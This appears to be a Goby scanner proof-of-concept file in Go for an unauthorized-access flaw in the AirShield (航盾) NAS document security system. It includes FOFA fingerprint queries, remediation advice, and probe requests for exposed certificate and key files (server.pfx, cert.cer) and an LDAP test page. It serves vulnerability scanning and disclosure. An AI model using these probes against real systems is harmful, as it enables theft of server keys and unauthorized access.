package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

//cert.cer 确认

func init() {
    expJson := `{
    "Name": "Air Shield NAS electronic document security management system unauthorized access to website information",
    "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>The system web page can be accessed without authorization, and download certificate information.</p>",
    "Product": "Air Shield NAS",
    "Homepage": "null",
    "DisclosureDate": "2021-06-01",
    "Author": "mayi",
    "FofaQuery": "body=\"航盾NAS\"",
    "GobyQuery": "body=\"航盾NAS\"",
    "Level": "1",
    "Impact": "<p>There is an unauthorized vulnerability in the AirShield NAS electronic document security management system. Attackers can access the webpage function page and download the certificate.</p>",
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.0",
    "Is0day": true,
    "Recommendation": "<p>1. Perform permission verification on pages such as website functions.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "航盾NAS电子文档安全管理系统未授权访问",
            "Product": "航盾NAS电子文档安全管理系统",
            "Description": "<p>航盾NAS电子文档安全管理系统在安全管理标准的基础上，通过密级控制、文件交换控制等技术实现信息系统内大文件快速传递等功能。</p><p>该系统网页可未授权访问，并下载证书信息的等。</p>",
            "Recommendation": "<p>1、对网站功能等页面做权限校验。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>航盾NAS电子文档安全管理系统存在未授权漏洞，攻击者通过访问网页功能页面及下载证书等。</p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "信创",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Air Shield NAS electronic document security management system unauthorized access to website information",
            "Product": "Air Shield NAS",
            "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>The system web page can be accessed without authorization, and download certificate information.</p>",
            "Recommendation": "<p>1. Perform permission verification on pages such as website functions.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an unauthorized vulnerability in the AirShield NAS electronic document security management system. Attackers can access the webpage function page and download the certificate.</p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "Information technology application innovation industry"
            ]
        }
    },
    "References": [],
    "HasExp": false,
    "ExpParams": [],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/sp/html/certs/server.pfx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sp/html/certs/cert.cer",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sp/Ldaptest_login.jsp?specUsers=test",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "Information technology application innovation industry"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "航盾NAS电子文档安全管理系统"
        ]
    },
    "PocId": "7365"
}`
//  /sp/diskManager/iscsilogin.jsp
    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
//       ./goscanner -m HandunNAS_unauth -t 172.16.14.133
